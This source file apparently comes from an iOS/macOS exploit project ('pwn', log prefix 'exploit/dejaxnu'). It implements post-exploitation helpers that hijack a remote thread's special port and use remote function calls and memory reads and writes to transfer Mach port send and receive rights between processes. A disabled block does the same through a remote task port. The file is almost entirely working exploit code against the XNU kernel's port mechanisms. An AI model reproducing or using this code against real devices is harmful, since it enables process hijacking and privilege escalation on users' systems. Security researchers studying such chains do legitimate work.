//
//  dxnu_rports.c
//  pwn
//
//  Created by Sem Voigtländer on 1/8/19.
//  Copyright © 2019 Sem Voigtländer. All rights reserved.
//


#include <stdio.h>
#include <mach/mach.h>
#include <string.h>
#include <stdlib.h>
#include "remoteports.h"
#include "remotecall.h"
#include "remotemem.h"

// we can't use the task port to directly manipulate the port namespace so instead we hijack the thread special port
// mechanism to transfer send rights by temporarily handing them of the thread_t

// do this without using REMOTE_MEMORY, as we'll build remote memory on top of this

mach_port_name_t
push_local_send(mach_port_t remote_thread_port,
                mach_port_t sright_to_push) {
    kern_return_t err;
    // save the current thread special port:
    mach_port_t saved_special_port = MACH_PORT_NULL;
    err = thread_get_special_port(remote_thread_port, THREAD_KERNEL_PORT, &saved_special_port);
    if (err != KERN_SUCCESS) {
        printf("[exploit/dejaxnu]: failed to get original special port\n");
        return 0;
    }
    printf("[exploit/dejaxnu]: thread's original special port: 0x%x\n", saved_special_port);
    
    // set the target port to transfer as the special port:
    err = thread_set_special_port(remote_thread_port, THREAD_KERNEL_PORT, sright_to_push);
    if (err != KERN_SUCCESS) {
        printf("failed to set target port as the thread special port\n");
        return 0;
    }
    
    // make a remote call to get the special port in the target:
    
    // what is the thread called in the remote target?
    mach_port_name_t remote_thread_port_name = 0x407;//(mach_port_name_t) thread_call_remote(remote_thread_port, mach_thread_self, 0);
    printf("remote_thread_port_name: 0x%x\n", remote_thread_port_name);
    
    // allocate a remote buffer for the send port name, but don't use the REMOTE_MEMORY primitives here
    uint64_t remote_name_buffer = (uint64_t) thread_call_remote(remote_thread_port, malloc, 1, REMOTE_LITERAL(8));
    
    err = (kern_return_t) thread_call_remote(remote_thread_port, thread_get_special_port, 3, REMOTE_LITERAL(remote_thread_port_name), REMOTE_LITERAL(THREAD_KERNEL_PORT), REMOTE_LITERAL(remote_name_buffer));
    if (err != KERN_SUCCESS) {
        printf("remote thread_get_special_port inside push_local_send failed: %x %s\n", err, mach_error_string(err));
        return 0;
    }
    
    mach_port_name_t remote_name = (mach_port_name_t) thread_r64(remote_thread_port, remote_name_buffer);
    printf("remote name for pushed port: 0x%x\n", remote_name);
    
    // cleanup:
    thread_call_remote(remote_thread_port, free, 1, REMOTE_LITERAL(remote_name_buffer));
    
    // we leak a thread port sright...
    
    // restore the special port
    
    err = thread_set_special_port(remote_thread_port, THREAD_KERNEL_PORT, saved_special_port);
    if (err != KERN_SUCCESS) {
        printf("failed to restore the original thread special port\n");
        return 0;
    }
    
    // drop the uref we got for the saved special port
    mach_port_deallocate(mach_task_self(), saved_special_port);
    
    return remote_name;
}

mach_port_t pull_remote_send(mach_port_t remote_thread_port,
                             mach_port_name_t remote_send_right_name) {
    kern_return_t err;
    
    // save the current thread special port:
    mach_port_t saved_special_port = MACH_PORT_NULL;
    err = thread_get_special_port(remote_thread_port, THREAD_KERNEL_PORT, &saved_special_port);
    if (err != KERN_SUCCESS) {
        printf("failed to get original special port\n");
        return 0;
    }
    printf("thread's original special port: 0x%x\n", saved_special_port);
    
    // remotely set the special port:
    err = (kern_return_t)thread_call_remote(remote_thread_port, thread_set_special_port, 3, REMOTE_LITERAL(0x407), REMOTE_LITERAL(THREAD_KERNEL_PORT), REMOTE_LITERAL(remote_send_right_name));
    if (err != KERN_SUCCESS) {
        printf("failed to remotely set the thread special port: 0x%x %s\n", err, mach_error_string(err));
        return MACH_PORT_NULL;
    }
    
    // read that port locally:
    mach_port_t local_name = MACH_PORT_NULL;
    err = thread_get_special_port(remote_thread_port, THREAD_KERNEL_PORT, &local_name);
    if (err != KERN_SUCCESS) {
        printf("failed to get fake special port locally: 0x%x %s\n", err, mach_error_string(err));
        return MACH_PORT_NULL;
    }
    
    // reset the special port
    err = thread_set_special_port(remote_thread_port, THREAD_KERNEL_PORT, saved_special_port);
    if (err != KERN_SUCCESS) {
        printf("failed to reset thread special port %x %s\n", err, mach_error_string(err));
        return MACH_PORT_NULL;
    }
    
    return local_name;
}


mach_port_t pull_remote_receive(mach_port_t remote_thread_port,
                                mach_port_name_t remote_receive_right_name) {
    // can't use the thread special port trick here so lets inject a send right and move the target port back as a mach message:
    kern_return_t err;
    
    mach_port_t q = MACH_PORT_NULL;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
    if (err != KERN_SUCCESS) {
        printf("failed to allocate a local port\n");
        return MACH_PORT_NULL;
    }
    
    err = mach_port_insert_right(mach_task_self(), q, q, MACH_MSG_TYPE_MAKE_SEND);
    if (err != KERN_SUCCESS) {
        printf("failed to insert a send right\n");
        return MACH_PORT_NULL;
    }
    
    // move that to the target:
    mach_port_name_t remote_q_name = push_local_send(remote_thread_port, q);
    
    // build a message to send back in the target:
    uint64_t buf[5] = {0};
    
    
    struct remote_port_send_msg {
        mach_msg_header_t hdr; // 0x18
        mach_msg_body_t body;  // 0x4
        mach_msg_port_descriptor_t desc; // 0xc
    }; // 0x28
    
    if (sizeof(struct remote_port_send_msg) != sizeof(buf)) {
        printf("sizes don't match, msg: %lu buf: %lu\n", sizeof(struct remote_port_send_msg), sizeof(buf));
    }
    
    struct remote_port_send_msg* msg = (struct remote_port_send_msg*)buf;
    
    msg->hdr.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, 0, 0, 0) | MACH_MSGH_BITS_COMPLEX;
    msg->hdr.msgh_size = 0x28;
    msg->hdr.msgh_remote_port = remote_q_name;
    msg->hdr.msgh_local_port = MACH_PORT_NULL;
    msg->hdr.msgh_voucher_port = MACH_PORT_NULL;
    msg->hdr.msgh_id = 0x41424344;
    
    msg->body.msgh_descriptor_count = 1;
    
    msg->desc.name = remote_receive_right_name;
    msg->desc.disposition = MACH_MSG_TYPE_MOVE_RECEIVE;
    msg->desc.type = MACH_MSG_PORT_DESCRIPTOR;
    
    // allocate a remote buffer to hold that:
    uint64_t remote_buf = (uint64_t)thread_call_remote(remote_thread_port, malloc, 1, REMOTE_LITERAL(0x28));
    
    // copy the message in to the target:
    thread_w64(remote_thread_port, remote_buf,      buf[0]);
    thread_w64(remote_thread_port, remote_buf+0x8,  buf[1]);
    thread_w64(remote_thread_port, remote_buf+0x10, buf[2]);
    thread_w64(remote_thread_port, remote_buf+0x18, buf[3]);
    thread_w64(remote_thread_port, remote_buf+0x20, buf[4]);
    
    // send the message:
    err = (uint32_t)thread_call_remote(remote_thread_port, mach_msg_send, 1, REMOTE_LITERAL(remote_buf));
    if (err != KERN_SUCCESS) {
        printf("remote mach_msg_send failed: 0x%x (%s)\n", err, mach_error_string(err));
        return MACH_PORT_NULL;
    }
    
    // receive that message:
    struct remote_port_send_msg* rmsg = malloc(0x1000);
    memset(rmsg, 0, 0x1000);
    
    rmsg->hdr.msgh_local_port = q;
    rmsg->hdr.msgh_size = 0x1000;
    
    printf("about to try to receive message\n");
    
    err = mach_msg_receive(&(rmsg->hdr));
    
    if (err != KERN_SUCCESS) {
        printf("failed to MOVE_RECEIVE receive message %x %s\n", err, mach_error_string(err));
        return MACH_PORT_NULL;
    }
    
    
    mach_port_t local_recv = rmsg->desc.name;
    
    printf("received port %x\n", local_recv);
    
    // TODO: cleanup
    
    return local_recv;
}


#if 0
// copy/move the right named by remote_port_name+disposition into this process, returning our name
mach_port_t
pull_remote_port(
                 mach_port_t task_port,
                 mach_port_name_t remote_port_name,
                 mach_port_right_t disposition)     // eg MACH_MSG_TYPE_COPY_SEND
{
    kern_return_t err;
    mach_port_t local_name = MACH_PORT_NULL;
    mach_msg_type_name_t local_rights = 0;
    err = mach_port_extract_right(task_port, remote_port_name, disposition, &local_name, &local_rights);
    if (err != KERN_SUCCESS) {
        printf("unable to extract right from remote task: %x %s\n", err, mach_error_string(err));
        return 0;
    }
    
    return local_name;
}

#define PUSH_PORT_MSGH_ID 0x74726f70

// pushing a local port to a remote process is more tricky:
// mach_port_insert_right requires you to specify the name of the new right;
// if that name doesn't exist in the destination space it will be allocated
// This makes things a bit fiddly as we'd have to come up with a name ourselves
// then check it succeeded etc
// Instead we can do it the proper way by sending the right in a mach message
// This will require a remote call though to receive the message in the context of the receiver
mach_port_name_t
push_local_port(mach_port_t remote_task_port,
                mach_port_t port_to_push,
                mach_port_right_t disposition)
{
    kern_return_t err;
    
    // allocate a receive right in the remote task:
    mach_port_name_t remote_receive_right_name = MACH_PORT_NULL;
    err = mach_port_allocate(remote_task_port, MACH_PORT_RIGHT_RECEIVE, &remote_receive_right_name);
    if (err != KERN_SUCCESS){
        printf("unable to allocate a receive right in the target %s %x", mach_error_string(err), err);
        return MACH_PORT_NULL;
    }
    
    // give ourselves a send right to that port:
    mach_port_t local_send_right_name = pull_remote_port(remote_task_port, remote_receive_right_name, MACH_MSG_TYPE_MAKE_SEND);
    
    // send the port - use the "reply port", we can actually send any right in there
    mach_msg_header_t msg = {0};
    
    msg.msgh_bits = MACH_MSGH_BITS_SET_PORTS(MACH_MSG_TYPE_COPY_SEND, disposition, 0);
    msg.msgh_size = sizeof(mach_msg_header_t);
    msg.msgh_remote_port = local_send_right_name;
    msg.msgh_local_port = port_to_push;
    msg.msgh_voucher_port = MACH_PORT_NULL;
    msg.msgh_id = PUSH_PORT_MSGH_ID;
    
    // send that:
    mach_msg_send(&msg);
    
    // receive it remotely:
    struct {
        mach_msg_header_t hdr;
        mach_msg_trailer_t trailer;
    } receive_msg;
    
    // we can't do this locally as mach_msg is only a mach_trap
    err = (kern_return_t) call_remote(remote_task_port, mach_msg, 7,
                                      REMOTE_OUT_BUFFER(&receive_msg, sizeof(receive_msg)),
                                      REMOTE_LITERAL(MACH_RCV_MSG | MACH_MSG_TIMEOUT_NONE),
                                      REMOTE_LITERAL(0),
                                      REMOTE_LITERAL(sizeof(receive_msg)),
                                      REMOTE_LITERAL(remote_receive_right_name),
                                      REMOTE_LITERAL(0),
                                      REMOTE_LITERAL(0));
    
    if (err != KERN_SUCCESS){
        printf("remote mach_msg failed: %s %x\n", mach_error_string(err), err);
        return MACH_PORT_NULL;
    }
    
    if (receive_msg.hdr.msgh_id != PUSH_PORT_MSGH_ID) {
        printf("received message doesn't have the expected msgh_id...\n");
        return MACH_PORT_NULL;
    }
    
    mach_port_name_t remote_name_for_local_port = receive_msg.hdr.msgh_remote_port;
    if (remote_name_for_local_port == MACH_PORT_NULL) {
        printf("mach_msg receive success but target didn't get a name for the port...\n");
        return MACH_PORT_NULL;
    }
    
    // clean up
    mach_port_deallocate(mach_task_self(), local_send_right_name);
    mach_port_destroy(remote_task_port, remote_receive_right_name);
    
    return remote_name_for_local_port;
}
#endif
